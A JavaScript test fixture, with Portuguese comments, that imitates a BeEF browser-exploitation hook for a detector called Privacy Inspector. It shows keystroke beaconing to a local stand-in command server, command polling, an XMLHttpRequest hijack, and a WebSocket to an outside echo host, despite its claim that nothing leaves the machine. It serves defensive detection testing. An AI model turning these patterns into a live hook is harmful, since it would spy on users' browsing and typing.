/*
 * Hook simulado, inspirado no comportamento do BeEF (Browser Exploitation
 * Framework). Reproduz os sinais que o Privacy Inspector deve detectar, sem
 * enviar nada para fora da máquina.
 */
(function () {
  var C2 = "http://127.0.0.1:8001";

  // 1. Assinatura global, como o objeto `beef` criado pelo hook.js real.
  window.beef = { version: "simulado", session: Math.random().toString(36).slice(2) };

  // 2. Captura de teclas digitadas na página.
  document.addEventListener("keydown", function (e) {
    new Image().src = C2 + "/k?c=" + encodeURIComponent(e.key.length === 1 ? "*" : e.key);
  });

  // 3. Substituição de API nativa para espionar as requisições da página.
  var originalOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url) {
    return originalOpen.apply(this, arguments);
  };

  // 4. Canal de comando por polling: pergunta ao servidor a cada 2 s se há ordens.
  setInterval(function () {
    fetch(C2 + "/poll?id=" + window.beef.session).catch(function () {});
  }, 2000);

  // 5. Canal alternativo por WebSocket (o BeEF oferece os dois).
  try {
    new WebSocket("wss://echo.websocket.org/");
  } catch (e) {}
})();
